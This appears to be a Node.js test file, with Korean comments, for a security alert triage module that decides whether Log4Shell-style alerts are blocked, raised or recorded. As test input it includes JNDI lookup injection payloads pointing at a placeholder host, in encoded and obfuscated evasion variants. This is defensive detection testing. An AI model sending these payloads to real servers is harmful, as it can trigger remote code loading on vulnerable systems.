import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { test } from 'node:test';

const dir = new URL('../xdr/known-cve/', import.meta.url);
const source = await readFile(new URL('decide.mjs', dir), 'utf8');
const { decide, PATTERNS } = await import(new URL('decide.mjs', dir));

test('decide.mjs는 import·파일 접근·바깥 요청 없이 파일 하나로 실행됩니다', async () => {
  assert.doesNotMatch(source, /^\s*import\s|import\(|require\(|readFile|writeFile|fetch\(|process\./m);
  const mod = await import(`data:text/javascript;base64,${Buffer.from(source).toString('base64')}`);
  const { alerts } = JSON.parse(await readFile(new URL('../fixtures/known-cve.json', dir), 'utf8'));
  for (const a of alerts) assert.deepEqual(await mod.decide(a), decide(a), a.id);
});

test('decide.mjs 패턴 값이 patterns.json과 같습니다', async () => {
  const { patterns } = JSON.parse(await readFile(new URL('patterns.json', dir), 'utf8'));
  assert.deepEqual(PATTERNS, patterns.map(({ id, name, condition }) => ({ id, name, condition })));
});

// 공식 경보에 없는 변형 입력: 완전한 구문 + 수준이 있어야 block, 글자·조각·도구 흔적만은 alert.
const alert = (data, level = 12, mitre = ['T1190'], description = '') => ({ rule: { level, description, mitre }, data: { srcip: '192.0.2.1', ...data } });

test('변형 입력도 구문·수준 기준으로 나뉩니다', () => {
  assert.equal(decide(alert({ useragent: '${jndi:rmi://192.0.2.9/a}' })).action, 'block');
  assert.equal(decide(alert({ url: '/s?q=%24%7Bjndi%3Aldap%3A%2F%2F192.0.2.9%2Fa%7D' })).action, 'block'); // 인코딩
  assert.equal(decide(alert({ url: '/s?q=${${lower:j}${upper:n}di:ldap://192.0.2.9/a}' })).action, 'block'); // 끼워 넣기
  assert.equal(decide(alert({ useragent: '${${::-j}ndi:dns://192.0.2.9/a}' })).action, 'block');
  assert.equal(decide(alert({ useragent: '${jndi:ldap://192.0.2.9/a}' }, 8)).action, 'alert'); // 수준 미달
  assert.equal(decide(alert({ useragent: 'nuclei - open-source project' })).action, 'alert'); // 도구 흔적만
  assert.equal(decide(alert({ url: '/search?q=jndi-ldap-lesson' })).action, 'alert'); // 글자만
  assert.equal(decide(alert({ url: '/search?q=${jndi:' })).action, 'alert'); // 잘린 조각
  assert.equal(decide(alert({ url: '/' }, 3, [])).action, 'record');
  for (const d of [decide(alert({ useragent: '${jndi:ldap://x/a}' })), decide(alert({ url: '/' }, 3, []))]) {
    assert.ok(Number.isFinite(d.confidence) && d.confidence >= 0 && d.confidence <= 1 && typeof d.reason === 'string');
  }
});
